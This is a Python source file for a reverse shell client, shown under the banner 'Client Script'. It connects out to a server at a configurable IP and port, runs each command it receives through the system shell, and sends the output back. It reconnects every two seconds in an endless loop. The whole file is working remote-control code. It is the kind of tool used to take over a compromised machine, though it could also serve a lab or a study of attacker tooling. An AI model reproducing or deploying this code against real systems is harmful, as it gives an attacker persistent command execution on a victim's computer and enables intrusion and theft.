import socket
import subprocess
import os
import time
from colorama import Fore, Style, init
from pyfiglet import Figlet
import argparse

init()

arg_parser = argparse.ArgumentParser()
arg_parser.add_argument("-i", "--ip", help="Server IP address", default="127.0.0.1")
arg_parser.add_argument("-p", "--port", help="Server port", type=int, default=1234)
retry_delay = 2  # seconds


def main():
    args = arg_parser.parse_args()
    ip = args.ip
    port = args.port

    def execute_command(command):
        try:
            if command.startswith("cd"):
                # Extract the directory from the "cd" command
                directory = command[3:]
                os.chdir(directory)
                result = f"Changed directory to: {directory}"
            else:
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)

            return result
        except subprocess.CalledProcessError as e:
            return f"{Fore.RED}Error: {e.returncode}\n{e.output}{Style.RESET_ALL}"
        except Exception as e:
            return f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}"

    def print_heading():
        f = Figlet(font="slant")
        heading = f.renderText("Client Script")
        print(f"{Fore.BLUE}{Style.BRIGHT}{heading}{Style.RESET_ALL}")

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            print(f"{Fore.GREEN}[+] Connected Successfully{Style.RESET_ALL}")

            while True:
                command = s.recv(1024).decode()
                if command.lower() == "exit":
                    break

                try:
                    result = execute_command(command)
                    print(f"{Fore.CYAN}{result}{Style.RESET_ALL}")
                    s.send(result.encode())
                except Exception as e:
                    print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}Retrying in {retry_delay} seconds...{Style.RESET_ALL}")
                    time.sleep(retry_delay)

        except Exception as e:
            print(f"{Fore.RED}Error connecting to the server: {str(e)}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Retrying in {retry_delay} seconds...{Style.RESET_ALL}")
            time.sleep(retry_delay)


        finally:
            s.close()
if __name__ == "__main__":
    main()

